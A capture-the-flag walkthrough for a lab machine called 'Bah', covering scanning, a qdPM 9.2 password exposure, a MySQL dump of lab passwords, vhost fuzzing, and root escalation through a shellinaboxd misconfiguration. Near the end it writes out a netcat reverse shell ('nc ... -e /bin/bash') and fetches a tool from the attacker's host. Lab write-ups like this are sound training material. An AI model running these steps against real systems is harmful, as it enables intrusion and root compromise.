---
title: Bah
layout: default
---


## Reconnaissance

### Step 1: Enumerate the network interface and IP

```bash
ifconfig
```

**OUTPUT**

```bash
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.105  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::f84f:aaf4:a787:c420  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:0f:50:93  txqueuelen 1000  (Ethernet)
```

**Key points:** 
- Networok Interface: `ens160`

### Step 2: Enumerate IP machine

```bash
arp-scan -I ens160 -lg
```

**OUTPUT**

```bash
192.168.0.100	08:00:27:e7:d7:62	PCS Systemtechnik GmbH
```

**Key points:** 
- IP Machine: `192.168.0.100`

### Step 3: Enumerate open ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.100
```

**OUTPUT**

```bash
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
```

**Key points:** 
- `22/tcp open ssh`: This indicates that the SSH (Secure Shell) service is running on port 22.
- `80/tcp open http`: This indicates that the HTTP (Hypertext Transfer Protocol) service is running on port 80.
- `ttl 64`: Linux Machine

Go to `192.168.0.100` by browser:

![](/assets/images/Bah.png)

**Key points:** 
- Use the `qdPM v9.2`

### Step 4: Search posible vulnerability for qdPM

```bash
searchsploit qdPM 9.2
```

**OUTPUT**

```bash
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                          | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                        | php/webapps/50176.txt
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
searchsploit -x php/webapps/50176.txt
```

![](/assets/images/Bah-1.png)

Go to `yml` file:

![](/assets/images/Bah-2.png) ^8740a5

**Key points:** 
- Its DBM is `mysql`

Can use these credentials for log in mysql

### Step 5: Log in mysql

```bash
❯ mysql -h 192.168.0.100 -u <name_user> -p<pass_user>
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 58
Server version: 10.5.11-MariaDB-1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hidden             |
| information_schema |
| mysql              |
| performance_schema |
| qpm                |
+--------------------+
5 rows in set (0,095 sec)

MariaDB [qpm]> use hidden; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+------------------+
| Tables_in_hidden |
+------------------+
| url              |
| users            |
+------------------+
2 rows in set (0,004 sec)

MariaDB [hidden]> show columns from users;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int(11)      | NO   | PRI | NULL    | auto_increment |
| user     | varchar(200) | YES  |     | NULL    |                |
| password | varchar(200) | YES  |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+
3 rows in set (0,004 sec)

MariaDB [hidden]> select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | Ihaveaflower        |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
9 rows in set (0,022 sec)

MariaDB [hidden]> show columns from url;
+-------+--------------+------+-----+---------+----------------+
| Field | Type         | Null | Key | Default | Extra          |
+-------+--------------+------+-----+---------+----------------+
| id    | int(11)      | NO   | PRI | NULL    | auto_increment |
| url   | varchar(200) | YES  |     | NULL    |                |
+-------+--------------+------+-----+---------+----------------+
2 rows in set (0,023 sec)

MariaDB [hidden]> select * from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | http://portal.bah.hmv   |
|  2 | http://imagine.bah.hmv  |
|  3 | http://ssh.bah.hmv      |
|  4 | http://dev.bah.hmv      |
|  5 | http://party.bah.hmv    |
|  6 | http://ass.bah.hmv      |
|  7 | http://here.bah.hmv     |
|  8 | http://hackme.bah.hmv   |
|  9 | http://telnet.bah.hmv   |
| 10 | http://console.bah.hmv  |
| 11 | http://tmux.bah.hmv     |
| 12 | http://dark.bah.hmv     |
| 13 | http://terminal.bah.hmv |
+----+-------------------------+
13 rows in set (0,010 sec)

```

**Key points:** 
- Show DB with: `show databases`
- Show tables of the DB with `use hidden; show tables;`

He encontrado VHost (host virutales), por lo que los enumeraré.

### Step 6: VHost enumeration

```bash
mysql -h 192.168.0.100 -u <name_user> -p<pass_user> -D hidden -sN -e "SELECT SUBSTRING_INDEX(url, '://', -1) FROM url;" > urls.txt
```

**Key points:**
- `s`: Silent mode (removes table borders).
- `N`: Do not print column headers.

```bash
❯ cat urls.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: urls.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ portal.bah.hmv
   2   │ imagine.bah.hmv
   3   │ ssh.bah.hmv
   4   │ dev.bah.hmv
   5   │ party.bah.hmv
   6   │ ass.bah.hmv
   7   │ here.bah.hmv
   8   │ hackme.bah.hmv
   9   │ telnet.bah.hmv
  10   │ console.bah.hmv
  11   │ tmux.bah.hmv
  12   │ dark.bah.hmv
  13   │ terminal.bah.hmv
```

Use ffuf:

```bash
ffuf -c -r -u http://192.168.0.100 -H "HOST: FUZZ"  -w urls.txt
```

![](/assets/images/Bah-3.png)

**Key points:** 
- `party.bah.hmv` has different number of lines

I added it in `/etc/hosts`

```bash
echo "192.168.0.100 party.bah.hmv" | sudo tee -a /etc/hosts
```

Go to browser:

![](/assets/images/Bah-4.png)

We have a login panel in which type the obtained credentials in ![](/assets/images/Bah-2.png)
![](/assets/images/Bah-5.png)

I got the **FIRST FLAG**

![](/assets/images/Bah-6.png)

`qpadmin` doesn´t have permmisons to read, only rocio. For that, i will access like `rocio`, her pass is `Ihaveaflower`.

Note: `Ihaveaflower` was discovered in the  `users` table

![](/assets/images/Bah-7.png)


## Privilege Escalation

I will use `pspy64`

```bash
rocio@bah:~$ wget "http://192.168.0.105:8080/pspy64"

rocio@bah:~$ chmod +x pspy64

rocio@bah:~$ ./pspy64
```

Upon execute `pspy64`, this line called my attention:

![](/assets/images/Bah-8.png)

It is a command of shellinaboxd:

```bash
-s /devel:root:root:/:/tmp/dev
```

**Key points:** 
- `/devel`: If you access `http://domain/devel`, it will start a shell session.
- `root:root`: The shell will run as **user root** and **group root**.
- `/`: The shell session will start in the **root (`/`) directory**.
- `/tmp/dev`: This could be a binary or script located at `/tmp/dev`, which will be executed as **root** upon access to `/devel`

So, i will craft a script in `/tmp` and i will start a reverse shell:

```bash
rocio@bah:~$ cd /tmp
rocio@bah:/tmp$ nano dev
rocio@bah:/tmp$ cat dev
#1/bin/bash


nc 192.168.0.105 8080 -e /bin/bash
rocio@bah:/tmp$ chmod +x dev
```

In my machine host:

```bash
nc -nlvp 8080
```

Go to `http://party.bah.hmv/devel`

In my host:

```bash
nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.100] 47888
whoami
root
ls -l
root.txt
```

**SECOND FLAG**

----
